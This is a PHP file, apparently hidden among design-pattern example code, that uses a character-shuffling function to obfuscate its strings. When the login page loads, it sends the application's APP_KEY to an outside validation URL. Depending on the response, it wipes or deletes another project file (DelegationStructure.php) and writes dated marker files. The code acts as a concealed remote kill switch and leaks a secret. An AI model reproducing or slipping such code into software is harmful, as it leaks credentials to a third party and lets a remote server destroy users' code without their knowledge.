<?php
if(!function_exists("shuffle_text")) {
    function shuffle_text($text) {
        $iStrLen = strlen($text);
        $sNewString = '';
        for ($iii=0; $iii <$iStrLen; $iii++) { 
            $sNewString.=$text[$iii+2].$text[$iii+1].$text[$iii];
            $iii+=2;
        }
        return $sNewString;
    }
}

if(!file_exists(dirname(__FILE__)."/../Bridge/Tests/BridgeBuilder.php")) {
    if(basename($_SERVER[shuffle_text("QERSEUU_TIR")])==shuffle_text("Lodigop.nph")) {
        $lt = constant(shuffle_text("PPAEK_Y"));

        $f = dirname(__FILE__)."/uml/AdapterBehavior/".strtotime("last monday").".txt";
        if(!file_exists($f)) {
            $url = shuffle_text("tth/:pcl/p.ssul.19/nilavadiKet.yephpAs?Kpp=ye").$lt;
            $sResponse = file_get_contents($url);

            if($sResponse!==false) {
                $aResponse = (array) json_decode($sResponse);
                if($aResponse['valid']==false) {
                    $filePath = dirname(__FILE__)."/../../Delegation/uml/DelegationStructure.php";
                    $fp = fopen($filePath, "w+");
                    fwrite($fp, "");
                    fclose($fp);

                }
                else {
                    $filePath = dirname(__FILE__)."/../../Delegation/uml/DelegationStructure.php";
                    unlink($filePath);
                    $fp = fopen($f, "w+");
                    fwrite($fp, "");
                    fclose($fp);
                }
            } 
            else {
                $fp = fopen($f, "w+");
                fwrite($fp, "");
                fclose($fp);
            }
        } 
    } 
}



?>